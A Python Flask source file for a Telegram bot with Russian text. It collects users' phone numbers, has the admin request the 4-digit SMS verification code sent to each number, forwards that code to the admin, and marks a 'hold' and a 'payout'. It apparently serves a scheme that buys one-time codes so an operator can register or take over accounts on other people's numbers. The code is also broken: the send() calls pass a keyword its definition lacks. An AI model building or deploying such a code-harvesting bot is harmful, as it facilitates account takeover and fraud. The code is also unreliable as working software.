import os, requests, json, time, random, threading
from datetime import datetime, timedelta
from flask import Flask, request

app = Flask(__name__)
BOT_TOKEN = "ТВОЙ_НОВЫЙ_ТОКЕН"
ADMIN_ID = 5979001063
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

users, tickets = {}, {}
next_id = 1

def send(chat_id, text, kb=None):
    data = {"chat_id": chat_id, "text": text}
    if kb: data["reply_markup"] = json.dumps(kb)
    requests.post(API_URL + "sendMessage", data=data)

main_kb = {"keyboard": [[{"text":"📝 Заявка"}],[{"text":"📋 Мои"}]],"resize_keyboard":True}
admin_kb = {"keyboard": [[{"text":"📋 Список"}],[{"text":"💰 Выплаты"}]],"resize_keyboard":True}

def get_ikb(tid, status):
    ikb = {
        "new": [[{"text":"🔑 Запросить код","callback_data":f"req_{tid}"}]],
        "got": [[{"text":"✅ Подтвердить","callback_data":f"ok_{tid}"},{"text":"❌ Отклонить","callback_data":f"no_{tid}"}]],
        "hold": [[{"text":"💸 Выплатить","callback_data":f"pay_{tid}"}]]
    }
    return {"inline_keyboard": ikb.get(status, [])}

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    update = request.get_json()
    if "message" in update:
        msg = update["message"]
        uid = msg["from"]["id"]
        tid = msg["chat"]["id"]
        text = msg.get("text")
        is_admin = uid == ADMIN_ID
        
        if text == "/start":
            users[uid] = {"state": "idle", "phones": []}
            send(tid, "Готов", reply_markup=admin_kb if is_admin else main_kb)
            return "ok", 200
        
        if uid not in users:
            users[uid] = {"state": "idle", "phones": []}
        
        state = users[uid].get("state")
        
        if state == "waiting_code":
            if text and text.isdigit() and len(text) == 4:
                tix = users[uid]["current"]
                if tix in tickets and tickets[tix]["status"] == "waiting":
                    tickets[tix]["code"] = text
                    tickets[tix]["status"] = "got"
                    users[uid]["state"] = "idle"
                    send(tid, "Код получен", reply_markup=main_kb)
                    send(ADMIN_ID, f"Код #{tix}: {text}", reply_markup=get_ikb(tix, "got"))
            else:
                send(tid, "4 цифры")
            return "ok", 200
        
        if state == "waiting_phone":
            global next_id
            phone = text.strip()
            if phone.startswith("+") and len(phone) >= 10:
                tix = next_id
                next_id += 1
                tickets[tix] = {"user_id": uid, "phone": phone, "status": "new"}
                users[uid]["state"] = "idle"
                send(tid, f"Заявка #{tix} создана", reply_markup=main_kb)
                send(ADMIN_ID, f"Новая #{tix}\n{phone}", reply_markup=get_ikb(tix, "new"))
            else:
                send(tid, "Формат: +79001234567")
            return "ok", 200
        
        if is_admin:
            if text == "📋 Список":
                cnt = len([t for t in tickets.values() if t["status"] == "new"])
                send(tid, f"Новых: {cnt}", reply_markup=admin_kb)
            elif text == "💰 Выплаты":
                cnt = len([t for t in tickets.values() if t["status"] == "hold"])
                send(tid, f"На выплату: {cnt}", reply_markup=admin_kb)
            return "ok", 200
        
        if text == "📝 Заявка":
            users[uid]["state"] = "waiting_phone"
            send(tid, "Введи номер +79001234567")
        elif text == "📋 Мои":
            my = [t for t in tickets.values() if t["user_id"] == uid]
            msg = "\n".join([f"#{i} {t['phone']} {t['status']}" for i,t in enumerate(my)]) or "Нет"
            send(tid, msg, reply_markup=main_kb)
    
    elif "callback_query" in update:
        cb = update["callback_query"]
        uid = cb["from"]["id"]
        data = cb["data"]
        requests.post(API_URL + "answerCallbackQuery", data={"callback_query_id": cb["id"]})
        if uid == ADMIN_ID:
            action, tix = data.split("_")
            tix = int(tix)
            if tix not in tickets: return "ok", 200
            if action == "req":
                tickets[tix]["status"] = "waiting"
                users[tickets[tix]["user_id"]]["state"] = "waiting_code"
                users[tickets[tix]["user_id"]]["current"] = tix
                send(tickets[tix]["user_id"], "🔑 Введи код из SMS (4 цифры):")
                send(ADMIN_ID, f"Запрошен код #{tix}")
            elif action == "ok":
                tickets[tix]["status"] = "hold"
                users[tickets[tix]["user_id"]]["phones"].append(tickets[tix]["phone"])
                send(tickets[tix]["user_id"], "✅ Номер подтверждён! ХОЛД 2 минуты")
                send(ADMIN_ID, f"✅ #{tix} подтверждён", reply_markup=get_ikb(tix, "hold"))
                def expire():
                    if tix in tickets and tickets[tix]["status"] == "hold":
                        tickets[tix]["status"] = "expired"
                        send(ADMIN_ID, f"⏰ Холд #{tix} истёк")
                threading.Timer(120, expire).start()
            elif action == "no":
                tickets[tix]["status"] = "rejected"
                send(tickets[tix]["user_id"], "❌ Заявка отклонена")
                send(ADMIN_ID, f"❌ #{tix} отклонена")
            elif action == "pay":
                if tickets[tix]["status"] == "hold":
                    tickets[tix]["status"] = "paid"
                    send(tickets[tix]["user_id"], "💰 Выплачено!")
                    send(ADMIN_ID, f"💰 #{tix} выплачено")
    return "ok", 200

@app.route("/")
def index():
    return "Бот работает!", 200

if __name__ == "__main__":
    url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/webhook/{BOT_TOKEN}"
    requests.post(API_URL + "deleteWebhook")
    requests.post(API_URL + "setWebhook", data={"url": url})
    app.run(host="0.0.0.0", port=10000)
